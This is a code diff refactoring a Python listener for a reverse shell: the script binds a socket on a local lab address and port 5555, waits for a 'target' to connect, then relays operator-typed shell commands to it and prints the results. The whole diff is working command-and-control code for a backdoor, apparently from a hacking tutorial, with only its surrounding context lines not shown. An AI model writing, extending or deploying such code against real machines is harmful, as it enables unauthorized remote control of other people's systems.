@@ -1,15 +1,12 @@
 import json
 import socket
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-
-
-def Send(data):
+def reliable_send(data):
     jsondata = json.dumps(data)
-    s.send(jsondata.encode())
+    target.send(jsondata.encode())
 
-def Recieve(target):
+
+def reliable_recieve():
     data = ''
     while True:
         try:
@@ -18,25 +15,22 @@ def Recieve(target):
         except ValueError:
             continue
 
-def target_communication(ip, target):
+
+def target_communication():
     while True:
-        command = input('*Shell~%s:' % str(ip))
-        Send(command)
+        command = input('* Shell~%s: ' % str(ip))
+        reliable_send(command)
         if command == "quit":
             break
-        result = Recieve(target)
+        result = reliable_recieve()
         print(result)
 
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.bind(("10.0.2.15", 5555))
+print("Listening for incoming connections")
+sock.listen(5)
+target, ip = sock.accept()
+print("[+] Target connected from: ", str(ip))
 
+target_communication()
 
-def main():
-    s.bind(("10.0.2.15", 5555))
-    print("Listening for incoming connections")
-    s.listen(5)
-    target, ip = s.accept()
-    print("[+] Target connected from: ", str(ip))
-
-
-    target_communication(ip, target)
-
-main()
